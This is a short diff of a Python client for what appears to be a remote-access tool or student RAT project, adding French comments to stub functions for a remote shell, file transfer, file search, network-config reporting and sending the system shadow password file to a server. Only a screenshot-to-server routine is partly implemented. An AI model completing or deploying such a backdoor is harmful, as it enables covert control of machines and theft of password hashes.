@@ -7,18 +7,23 @@ from PIL import ImageGrab  # Importer ImageGrab depuis Pillow
 
 SERVER_PORT = 8888
 
+# Fonction permettant d'envoyer la liste des commandes disponibles
 def menu_help(ssl_socket):
     print('help')
 
+# Fonction permettant de charger un fichier du serveur
 def download(ssl_socket):
     print('download')
 
+# Fonction permettant de télécharger un fichier du serveur
 def upload(ssl_socket):
     print('upload')
 
+# Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
     print('shell')
 
+# Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
     print('ipconfig')
 
@@ -34,11 +39,15 @@ def screenshot(ssl_socket):
             ssl_socket.send(screenshot_to_send) # Envoie de la capture d'écran
     ssl_socket.send(b'END') # Envoie d'un délimiteur final
 
+# Fonction permettant de localiser le fichier demander par le serveur
 def search(ssl_socket):
     print('search')
 
+# Fonction permettant d'envoyer le fichier shadow au serveur
 def hashdump(ssl_socket):
     print('hashdump')
+
+
 
 def main():
 
